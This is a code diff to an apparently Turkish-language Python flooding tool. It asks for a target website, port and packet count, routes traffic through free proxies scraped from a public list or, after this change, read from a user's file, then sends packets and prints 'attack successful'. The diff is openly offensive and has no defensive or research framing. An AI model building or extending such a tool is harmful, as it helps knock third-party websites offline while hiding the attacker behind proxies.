@@ -49,13 +49,18 @@ host = input("Hedef website adresi: ")
 port = int(input("Hedef port numarası: "))
 packet_count = int(input("Gönderilecek paket sayısı: "))
 
-# Proxy listesini al
-proxy_list = []
-try:
-    response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http")
-    proxy_list = response.text.split('\r\n')
-except:
-    print("Proxy listesi alınamadı")
+proxy_source = input("Kullanıcının proxy listesini belirtmek ister misiniz? (yes/no)")
+if proxy_source.lower() == 'yes':
+    proxy_file = input("Proxy listesini içeren txt dosyasının adını giriniz: ")
+    with open(proxy_file, 'r') as f:
+        proxy_list = f.read().splitlines()
+else:
+    # Proxy listesini al
+    try:
+        response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http")
+        proxy_list = response.text.split('\r\n')
+    except:
+        print("Proxy listesi alınamadı")
 
 send_packets(host, port, packet_count, proxy_list)
 print("Saldırı başarılı")
